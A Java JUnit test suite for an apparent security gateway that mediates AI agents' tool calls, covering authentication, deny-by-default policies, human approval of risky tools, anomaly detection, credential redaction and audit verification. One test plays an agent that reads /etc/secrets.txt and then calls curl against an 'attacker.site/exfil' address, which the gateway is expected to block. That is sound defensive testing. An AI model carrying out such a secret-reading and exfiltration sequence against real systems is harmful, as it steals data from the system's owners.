package dev.aegismcp.e2e;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import dev.aegismcp.gateway.codec.JsonRpcResponse;
import dev.aegismcp.gateway.proxy.AgentIdentity;
import dev.aegismcp.gateway.proxy.UpstreamClient;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive End-to-End Verification Suite for Phase 1 Gate.
 * Validates Contracts C-001, C-003, C-004, C-005, C-006, C-007 and Features FEAT-001, FEAT-002, FEAT-004, FEAT-005, FEAT-006, FEAT-007.
 */
class Phase1EndToEndVerificationTest {

    private E2EGatewayFixture fixture;
    private HttpClient client;
    private final ObjectMapper mapper = new ObjectMapper();

    @BeforeEach
    void setUp() throws InterruptedException {
        fixture = new E2EGatewayFixture();
        client = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(5))
                .build();
    }

    @AfterEach
    void tearDown() {
        if (fixture != null) {
            fixture.close();
        }
    }

    // =========================================================================
    // C-001: JSON-RPC Proxying & Zero-Trust Authentication
    // =========================================================================

    @Test
    @DisplayName("C-001: Unauthenticated request to /mcp/v1/rpc returns HTTP 401 Unauthorized (-32000)")
    void testUnauthenticatedRpcRequestRejected() throws Exception {
        String rpcPayload = """
                {
                  "jsonrpc": "2.0",
                  "id": "req-1",
                  "method": "tools/call",
                  "params": {
                    "name": "echo",
                    "arguments": {"msg": "hello"}
                  }
                }
                """;

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(rpcPayload))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        assertEquals(401, response.statusCode());

        JsonNode json = mapper.readTree(response.body());
        assertTrue(json.has("error"), "Expected JSON-RPC error response");
        assertEquals(-32000, json.get("error").get("code").asInt());
        assertTrue(json.get("id").isNull(), "Unauthenticated JSON-RPC response ID must be null");
    }

    @Test
    @DisplayName("C-001: Valid Bearer token authenticates workload and proxies tool execution")
    void testBearerTokenAuthenticationSuccess() throws Exception {
        String rpcPayload = """
                {
                  "jsonrpc": "2.0",
                  "id": 100,
                  "method": "tools/call",
                  "params": {
                    "name": "echo",
                    "arguments": {"message": "hello aegis"}
                  }
                }
                """;

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-token-alpha")
                .POST(HttpRequest.BodyPublishers.ofString(rpcPayload))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, response.statusCode());

        JsonNode json = mapper.readTree(response.body());
        assertEquals(100, json.get("id").asInt());
        assertTrue(json.has("result"));
        assertEquals("executed", json.get("result").get("status").asText());
        assertEquals("tools/call", json.get("result").get("method").asText());
        assertEquals("echo", json.get("result").get("tool").asText());
    }

    @Test
    @DisplayName("C-001: Valid SPIFFE SVID header authenticates agent workload")
    void testSpiffeSvidAuthenticationSuccess() throws Exception {
        String rpcPayload = """
                {
                  "jsonrpc": "2.0",
                  "id": "spiffe-test-1",
                  "method": "tools/call",
                  "params": {
                    "name": "cluster_info",
                    "arguments": {}
                  }
                }
                """;

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header(AgentIdentity.HEADER_SPIFFE_ID, "spiffe://aegis.dev/ns/prod/sa/agent-worker")
                .POST(HttpRequest.BodyPublishers.ofString(rpcPayload))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, response.statusCode());

        JsonNode json = mapper.readTree(response.body());
        assertEquals("spiffe-test-1", json.get("id").asText());
        assertTrue(json.has("result"));
        assertEquals("cluster_info", json.get("result").get("tool").asText());
    }

    @Test
    @DisplayName("FEAT-001: Non-tool call (e.g. tools/list, initialize) proxies directly to upstream")
    void testNonToolCallPassesDirectly() throws Exception {
        String rpcPayload = """
                {
                  "jsonrpc": "2.0",
                  "id": "init-1",
                  "method": "tools/list",
                  "params": {}
                }
                """;

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-token-alpha")
                .POST(HttpRequest.BodyPublishers.ofString(rpcPayload))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, response.statusCode());

        JsonNode json = mapper.readTree(response.body());
        assertEquals("init-1", json.get("id").asText());
        assertEquals("tools/list", json.get("result").get("method").asText());
    }

    // =========================================================================
    // C-005 & C-006: Declarative Policy Publishing and Rule Enforcement
    // =========================================================================

    @Test
    @DisplayName("C-005, C-006: Publish security policy, query policies, and enforce AST rules")
    void testPolicyPublishingAndAstRuleEnforcement() throws Exception {
        try (E2EGatewayFixture emptyFixture = new E2EGatewayFixture(false)) {
            // Step 1: Query policies (initially empty)
            HttpRequest getReq = HttpRequest.newBuilder()
                    .uri(URI.create(emptyFixture.getBaseUrl() + "/api/v1/policies"))
                    .header("Authorization", "Bearer admin-token")
                    .GET()
                    .build();

            HttpResponse<String> getResp = client.send(getReq, HttpResponse.BodyHandlers.ofString());
            assertEquals(200, getResp.statusCode());
            JsonNode getJson = mapper.readTree(getResp.body());
            assertTrue(getJson.has("policies"));
            assertEquals(0, getJson.get("policies").size());

            // Step 2: Publish policy YAML restricting tools:
            // - Allows db_query only when max_rows <= 100
            // - All other tools (e.g. bash_exec) default to DENY
            String policyYaml = """
                    id: pol_e2e_rules
                    name: E2E Zero Trust Policy
                    version: 1.0.0
                    targetAgents:
                      - "*"
                    rules:
                      - id: rule_db_query
                        tool: db_query
                        action: allow
                        constraints:
                          - argument: max_rows
                            operator: lte
                            value: 100
                      - id: rule_echo
                        tool: echo
                        action: allow
                    """;

            ObjectNode postBody = mapper.createObjectNode();
            postBody.put("name", "E2E Zero Trust Policy");
            postBody.put("version", "1.0.0");
            postBody.put("rawYaml", policyYaml);
            postBody.put("gitCommitHash", "c0ffee123");

            HttpRequest postReq = HttpRequest.newBuilder()
                    .uri(URI.create(emptyFixture.getBaseUrl() + "/api/v1/policies"))
                    .header("Content-Type", "application/json")
                    .header("Authorization", "Bearer admin-token")
                    .POST(HttpRequest.BodyPublishers.ofString(postBody.toString()))
                    .build();

            HttpResponse<String> postResp = client.send(postReq, HttpResponse.BodyHandlers.ofString());
            assertEquals(201, postResp.statusCode());

            // Step 3: Verify GET /api/v1/policies returns the published policy
            HttpResponse<String> getAfterResp = client.send(getReq, HttpResponse.BodyHandlers.ofString());
            assertEquals(200, getAfterResp.statusCode());
            JsonNode policiesArr = mapper.readTree(getAfterResp.body()).get("policies");
            assertEquals(1, policiesArr.size());
            assertEquals("pol_e2e_rules", policiesArr.get(0).get("id").asText());

            // Step 4: Call allowed tool with compliant argument (db_query with max_rows = 50) -> HTTP 200
            String allowedCall = """
                    {
                      "jsonrpc": "2.0",
                      "id": "query-ok",
                      "method": "tools/call",
                      "params": {
                        "name": "db_query",
                        "arguments": {"query": "SELECT * FROM users", "max_rows": 50}
                      }
                    }
                    """;
            HttpRequest okReq = HttpRequest.newBuilder()
                    .uri(URI.create(emptyFixture.getBaseUrl() + "/mcp/v1/rpc"))
                    .header("Content-Type", "application/json")
                    .header("Authorization", "Bearer agent-token-1")
                    .POST(HttpRequest.BodyPublishers.ofString(allowedCall))
                    .build();

            HttpResponse<String> okResp = client.send(okReq, HttpResponse.BodyHandlers.ofString());
            assertEquals(200, okResp.statusCode());
            JsonNode okJson = mapper.readTree(okResp.body());
            assertEquals("query-ok", okJson.get("id").asText());
            assertEquals("db_query", okJson.get("result").get("tool").asText());

            // Step 5: Call allowed tool with argument violating constraint (max_rows = 500) -> HTTP 403 / -32001
            String violatedCall = """
                    {
                      "jsonrpc": "2.0",
                      "id": "query-violation",
                      "method": "tools/call",
                      "params": {
                        "name": "db_query",
                        "arguments": {"query": "SELECT * FROM users", "max_rows": 500}
                      }
                    }
                    """;
            HttpRequest violReq = HttpRequest.newBuilder()
                    .uri(URI.create(emptyFixture.getBaseUrl() + "/mcp/v1/rpc"))
                    .header("Content-Type", "application/json")
                    .header("Authorization", "Bearer agent-token-1")
                    .POST(HttpRequest.BodyPublishers.ofString(violatedCall))
                    .build();

            HttpResponse<String> violResp = client.send(violReq, HttpResponse.BodyHandlers.ofString());
            assertEquals(403, violResp.statusCode());
            JsonNode violJson = mapper.readTree(violResp.body());
            assertEquals(-32001, violJson.get("error").get("code").asInt());
            assertTrue(violJson.get("error").get("message").asText().contains("Policy Violation"));

            // Step 6: Call unauthorized tool (bash_exec) -> HTTP 403 / -32001 Fail-Closed
            String forbiddenToolCall = """
                    {
                      "jsonrpc": "2.0",
                      "id": "bash-forbidden",
                      "method": "tools/call",
                      "params": {
                        "name": "bash_exec",
                        "arguments": {"cmd": "id"}
                      }
                    }
                    """;
            HttpRequest forbReq = HttpRequest.newBuilder()
                    .uri(URI.create(emptyFixture.getBaseUrl() + "/mcp/v1/rpc"))
                    .header("Content-Type", "application/json")
                    .header("Authorization", "Bearer agent-token-1")
                    .POST(HttpRequest.BodyPublishers.ofString(forbiddenToolCall))
                    .build();

            HttpResponse<String> forbResp = client.send(forbReq, HttpResponse.BodyHandlers.ofString());
            assertEquals(403, forbResp.statusCode());
            JsonNode forbJson = mapper.readTree(forbResp.body());
            assertEquals(-32001, forbJson.get("error").get("code").asInt());
        }
    }

    // =========================================================================
    // C-003 & C-004: Human-in-the-Loop Approval Ticket Lifecycle
    // =========================================================================

    @Test
    @DisplayName("C-003, C-004: Suspend tool call requiring approval, query tickets, and resume upon APPROVE decision")
    void testHumanInTheLoopApprovalAndResumption() throws Exception {
        // Step 1: Publish policy requiring operator approval for "deploy_prod"
        String policyYaml = """
                id: pol_deploy_gate
                name: Deployment Gate Policy
                version: 1.0.0
                targetAgents:
                  - "*"
                rules:
                  - id: rule_deploy
                    tool: deploy_prod
                    action: require_approval
                    description: "Requires SecOps sign-off"
                """;

        ObjectNode postBody = mapper.createObjectNode();
        postBody.put("name", "Deployment Gate Policy");
        postBody.put("version", "1.0.0");
        postBody.put("rawYaml", policyYaml);
        postBody.put("gitCommitHash", "deploy123");

        HttpRequest postReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/api/v1/policies"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer admin-token")
                .POST(HttpRequest.BodyPublishers.ofString(postBody.toString()))
                .build();
        client.send(postReq, HttpResponse.BodyHandlers.ofString());

        // Step 2: Agent triggers tool call asynchronously
        String rpcCall = """
                {
                  "jsonrpc": "2.0",
                  "id": "deploy-task-42",
                  "method": "tools/call",
                  "params": {
                    "name": "deploy_prod",
                    "arguments": {"env": "production", "version": "v2.0.1"}
                  }
                }
                """;

        HttpRequest agentReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-worker-99")
                .POST(HttpRequest.BodyPublishers.ofString(rpcCall))
                .build();

        CompletableFuture<HttpResponse<String>> agentFuture = client.sendAsync(agentReq, HttpResponse.BodyHandlers.ofString());

        // Step 3: Wait briefly for ticket registration, then verify C-003 GET /api/v1/approvals?status=pending
        String ticketId = null;
        for (int i = 0; i < 20; i++) {
            Thread.sleep(100);
            HttpRequest getApprReq = HttpRequest.newBuilder()
                    .uri(URI.create(fixture.getBaseUrl() + "/api/v1/approvals?status=pending"))
                    .header("Authorization", "Bearer operator-token")
                    .GET()
                    .build();
            HttpResponse<String> apprResp = client.send(getApprReq, HttpResponse.BodyHandlers.ofString());
            if (apprResp.statusCode() == 200) {
                JsonNode tickets = mapper.readTree(apprResp.body()).get("tickets");
                if (tickets != null && tickets.size() > 0) {
                    ticketId = tickets.get(0).get("id").asText();
                    assertEquals("deploy_prod", tickets.get(0).get("toolName").asText());
                    break;
                }
            }
        }

        assertNotNull(ticketId, "Pending approval ticket should be present");
        assertFalse(agentFuture.isDone(), "Agent request must be suspended waiting for operator decision");

        // Step 4: C-004 Operator submits APPROVE decision
        String decisionBody = """
                {
                  "decision": "APPROVE",
                  "reviewer": "sec-ops-lead",
                  "reason": "Authorized release"
                }
                """;

        HttpRequest decisionReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/api/v1/approvals/" + ticketId + "/decision"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer operator-token")
                .POST(HttpRequest.BodyPublishers.ofString(decisionBody))
                .build();

        HttpResponse<String> decisionResp = client.send(decisionReq, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, decisionResp.statusCode());
        JsonNode decisionJson = mapper.readTree(decisionResp.body());
        assertTrue(decisionJson.get("status").asText().startsWith("APPROV"), "Decision status should be APPROVE or APPROVED");

        // Step 5: Verify agent's suspended request resumes and completes with HTTP 200
        HttpResponse<String> agentResp = agentFuture.get(5, TimeUnit.SECONDS);
        assertEquals(200, agentResp.statusCode());
        JsonNode agentJson = mapper.readTree(agentResp.body());
        assertEquals("deploy-task-42", agentJson.get("id").asText());
        assertEquals("deploy_prod", agentJson.get("result").get("tool").asText());
    }

    @Test
    @DisplayName("C-004: Operator REJECT decision immediately unblocks agent with HTTP 403 Policy Violation")
    void testHumanInTheLoopApprovalRejection() throws Exception {
        // Step 1: Publish policy requiring approval
        String policyYaml = """
                id: pol_reject_gate
                name: Reject Gate Policy
                version: 1.0.0
                targetAgents:
                  - "*"
                rules:
                  - id: rule_dangerous_op
                    tool: wipe_disk
                    action: require_approval
                """;

        ObjectNode postBody = mapper.createObjectNode();
        postBody.put("name", "Reject Gate Policy");
        postBody.put("version", "1.0.0");
        postBody.put("rawYaml", policyYaml);
        postBody.put("gitCommitHash", "rej123");

        HttpRequest postReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/api/v1/policies"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer admin-token")
                .POST(HttpRequest.BodyPublishers.ofString(postBody.toString()))
                .build();
        client.send(postReq, HttpResponse.BodyHandlers.ofString());

        // Step 2: Agent triggers tool call
        String rpcCall = """
                {
                  "jsonrpc": "2.0",
                  "id": "wipe-call-1",
                  "method": "tools/call",
                  "params": {
                    "name": "wipe_disk",
                    "arguments": {"target": "/data"}
                  }
                }
                """;

        HttpRequest agentReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-worker-99")
                .POST(HttpRequest.BodyPublishers.ofString(rpcCall))
                .build();

        CompletableFuture<HttpResponse<String>> agentFuture = client.sendAsync(agentReq, HttpResponse.BodyHandlers.ofString());

        // Wait for ticket
        String ticketId = null;
        for (int i = 0; i < 20; i++) {
            Thread.sleep(100);
            HttpRequest getApprReq = HttpRequest.newBuilder()
                    .uri(URI.create(fixture.getBaseUrl() + "/api/v1/approvals?status=pending"))
                    .header("Authorization", "Bearer operator-token")
                    .GET()
                    .build();
            HttpResponse<String> apprResp = client.send(getApprReq, HttpResponse.BodyHandlers.ofString());
            if (apprResp.statusCode() == 200) {
                JsonNode tickets = mapper.readTree(apprResp.body()).get("tickets");
                if (tickets != null && tickets.size() > 0) {
                    ticketId = tickets.get(0).get("id").asText();
                    break;
                }
            }
        }

        assertNotNull(ticketId);

        // Reject decision
        String decisionBody = """
                {
                  "decision": "REJECT",
                  "reviewer": "sec-ops-lead",
                  "reason": "Dangerous operation prohibited"
                }
                """;

        HttpRequest decisionReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/api/v1/approvals/" + ticketId + "/decision"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer operator-token")
                .POST(HttpRequest.BodyPublishers.ofString(decisionBody))
                .build();

        HttpResponse<String> decisionResp = client.send(decisionReq, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, decisionResp.statusCode());

        // Verify agent receives 403 Forbidden with -32001 Policy Violation
        HttpResponse<String> agentResp = agentFuture.get(5, TimeUnit.SECONDS);
        assertEquals(403, agentResp.statusCode());
        JsonNode json = mapper.readTree(agentResp.body());
        assertEquals(-32001, json.get("error").get("code").asInt());
        assertTrue(json.get("error").get("message").asText().toLowerCase().contains("rejected"), "Error message should mention rejection");
    }

    // =========================================================================
    // FEAT-004: Behavioral Anomaly Detection & Circuit Breaker Tripping
    // =========================================================================

    @Test
    @DisplayName("FEAT-004: Forbidden sequence (read_file followed by curl:exec) trips circuit breaker and quarantines agent")
    void testBehavioralAnomalyForbiddenSequenceDetection() throws Exception {
        // Step 1: First call - read_file (allowed)
        String call1 = """
                {
                  "jsonrpc": "2.0",
                  "id": "seq-1",
                  "method": "tools/call",
                  "params": {
                    "name": "read_file",
                    "arguments": {"path": "/etc/secrets.txt"}
                  }
                }
                """;
        HttpRequest req1 = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-malicious-1")
                .POST(HttpRequest.BodyPublishers.ofString(call1))
                .build();

        HttpResponse<String> resp1 = client.send(req1, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, resp1.statusCode());

        // Step 2: Second call - curl:exec (triggers DataExfiltrationTransitionRule)
        String call2 = """
                {
                  "jsonrpc": "2.0",
                  "id": "seq-2",
                  "method": "tools/call",
                  "params": {
                    "name": "curl:exec",
                    "arguments": {"url": "https://attacker.site/exfil"}
                  }
                }
                """;
        HttpRequest req2 = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-malicious-1")
                .POST(HttpRequest.BodyPublishers.ofString(call2))
                .build();

        HttpResponse<String> resp2 = client.send(req2, HttpResponse.BodyHandlers.ofString());
        assertEquals(403, resp2.statusCode());
        JsonNode json2 = mapper.readTree(resp2.body());
        assertEquals(-32001, json2.get("error").get("code").asInt());
        assertTrue(json2.get("error").get("message").asText().toLowerCase().contains("exfiltration"), "Expected data exfiltration detection");

        // Step 3: Third call - any benign tool is now blocked immediately because agent is quarantined
        String call3 = """
                {
                  "jsonrpc": "2.0",
                  "id": "seq-3",
                  "method": "tools/call",
                  "params": {
                    "name": "ping",
                    "arguments": {}
                  }
                }
                """;
        HttpRequest req3 = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-malicious-1")
                .POST(HttpRequest.BodyPublishers.ofString(call3))
                .build();

        HttpResponse<String> resp3 = client.send(req3, HttpResponse.BodyHandlers.ofString());
        assertEquals(403, resp3.statusCode());
        JsonNode json3 = mapper.readTree(resp3.body());
        assertTrue(json3.get("error").get("message").asText().contains("quarantine"));
    }

    @Test
    @DisplayName("FEAT-004: Rapid tool burst exceeding threshold trips circuit breaker")
    void testBehavioralAnomalyRapidToolBurst() throws Exception {
        try (E2EGatewayFixture burstFixture = new E2EGatewayFixture(5)) {
            String burstAgent = "agent-burst-tester";

            // Burst threshold is set to 5 calls in E2EGatewayFixture
            int completed = 0;
            int blocked = 0;

            for (int i = 1; i <= 8; i++) {
                String call = String.format("""
                        {
                          "jsonrpc": "2.0",
                          "id": "burst-%d",
                          "method": "tools/call",
                          "params": {
                            "name": "ping",
                            "arguments": {"seq": %d}
                          }
                        }
                        """, i, i);

                HttpRequest req = HttpRequest.newBuilder()
                        .uri(URI.create(burstFixture.getBaseUrl() + "/mcp/v1/rpc"))
                        .header("Content-Type", "application/json")
                        .header("Authorization", "Bearer " + burstAgent)
                        .POST(HttpRequest.BodyPublishers.ofString(call))
                        .build();

                HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
                if (resp.statusCode() == 200) {
                    completed++;
                } else if (resp.statusCode() == 403) {
                    blocked++;
                }
            }

            assertTrue(completed > 0, "Initial calls in burst window should succeed");
            assertTrue(blocked > 0, "Calls exceeding burst threshold must be blocked by circuit breaker");
        }
    }

    // =========================================================================
    // FEAT-005: Outbound DLP Scrubbing
    // =========================================================================

    @Test
    @DisplayName("FEAT-005: Outbound DLP scrubbing redacts AWS, OpenAI, Database URL, and Credit Card credentials")
    void testOutboundDlpScrubbing() throws Exception {
        // Configure upstream to return sensitive credentials in tool response
        String rawOpenAiKey = "sk-proj-abc1234567890abcdef1234567890abcdef";
        String rawAwsKey = "AKIAIOSFODNN7EXAMPLE";
        String rawDbUrl = "postgres://admin:topsecret123@db.prod.internal:5432/finance";
        String rawCard = "4111 1111 1111 1111";

        fixture.setUpstreamClient((context, request) -> {
            ObjectNode result = mapper.createObjectNode();
            result.put("status", "executed");
            result.put("apiKey", rawOpenAiKey);
            result.put("awsId", rawAwsKey);
            result.put("connectionString", rawDbUrl);
            result.put("paymentCard", rawCard);
            return CompletableFuture.completedFuture(JsonRpcResponse.success(request.id(), result));
        });

        String rpcCall = """
                {
                  "jsonrpc": "2.0",
                  "id": "dlp-test-1",
                  "method": "tools/call",
                  "params": {
                    "name": "get_sensitive_config",
                    "arguments": {}
                  }
                }
                """;

        HttpRequest req = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer agent-trusted")
                .POST(HttpRequest.BodyPublishers.ofString(rpcCall))
                .build();

        HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, resp.statusCode());

        String body = resp.body();

        // Assert sensitive secrets were masked
        assertFalse(body.contains(rawOpenAiKey), "Raw OpenAI API key must not leak");
        assertFalse(body.contains(rawAwsKey), "Raw AWS key must not leak");
        assertFalse(body.contains(rawDbUrl), "Raw database URL must not leak");
        assertFalse(body.contains(rawCard), "Raw credit card number must not leak");

        // Assert redacted placeholders were inserted
        assertTrue(body.contains("[REDACTED_API_KEY]"), "Expected [REDACTED_API_KEY]");
        assertTrue(body.contains("[REDACTED_DB_CREDENTIAL]"), "Expected [REDACTED_DB_CREDENTIAL]");
        assertTrue(body.contains("[REDACTED_PII]") || body.contains("[REDACTED_CREDIT_CARD]"), "Expected PII / Credit card redaction");
    }

    // =========================================================================
    // C-007: Tamper-Evident Audit Ledger & Merkle Root Verification
    // =========================================================================

    @Test
    @DisplayName("C-007: Verify tamper-evident audit ledger Merkle root via /api/v1/audit/verify")
    void testAuditLedgerMerkleVerificationEndpoint() throws Exception {
        // Step 1: Execute a few tool calls to generate audit records
        for (int i = 1; i <= 3; i++) {
            String call = String.format("""
                    {
                      "jsonrpc": "2.0",
                      "id": "audit-call-%d",
                      "method": "tools/call",
                      "params": {
                        "name": "echo",
                        "arguments": {"test": %d}
                      }
                    }
                    """, i, i);

            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create(fixture.getBaseUrl() + "/mcp/v1/rpc"))
                    .header("Content-Type", "application/json")
                    .header("Authorization", "Bearer agent-audited")
                    .POST(HttpRequest.BodyPublishers.ofString(call))
                    .build();

            HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
            assertEquals(200, resp.statusCode());
        }

        // Wait briefly for ledger flush
        Thread.sleep(200);

        // Step 2: Call C-007 GET /api/v1/audit/verify without auth -> 401 Unauthorized
        HttpRequest unauthReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/api/v1/audit/verify?fromBlock=0&toBlock=1"))
                .GET()
                .build();
        HttpResponse<String> unauthResp = client.send(unauthReq, HttpResponse.BodyHandlers.ofString());
        assertEquals(401, unauthResp.statusCode());

        // Step 3: Call C-007 with auditor credentials -> 200 OK with valid Merkle proof
        HttpRequest auditReq = HttpRequest.newBuilder()
                .uri(URI.create(fixture.getBaseUrl() + "/api/v1/audit/verify?fromBlock=0&toBlock=1"))
                .header("Authorization", "Bearer auditor-token-1")
                .GET()
                .build();

        HttpResponse<String> auditResp = client.send(auditReq, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, auditResp.statusCode());

        JsonNode auditJson = mapper.readTree(auditResp.body());
        assertTrue(auditJson.has("valid"));
        assertTrue(auditJson.get("valid").asBoolean(), "Merkle proof verification must be valid");
        assertTrue(auditJson.get("checkedBlocks").asLong() >= 2);
        assertTrue(auditJson.has("merkleRoot"));
        assertFalse(auditJson.get("merkleRoot").asText().isBlank());
        assertTrue(auditJson.has("latestBlockHash"));
        assertTrue(auditJson.get("brokenAtBlock").isNull());
    }
}
